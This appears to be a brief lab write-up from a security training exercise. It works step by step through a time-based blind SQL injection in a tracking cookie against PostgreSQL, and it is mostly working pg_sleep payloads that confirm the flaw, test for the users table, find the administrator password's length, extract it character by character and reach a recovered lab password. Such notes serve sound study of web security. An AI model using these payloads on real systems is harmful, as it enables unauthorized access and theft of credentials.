Lab #14 - Blind SQLi with time delays and informational retrieval

Vulnerable parameter - tracking cookie

End Goals:
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to SQLi

' || pg_sleep(10)--

2) Confirm that the users table exists in the database

' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
-> length of password is 20 characters

4) Enumerate the administrator password

' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--

13ipnob7l2dkjp3drryy


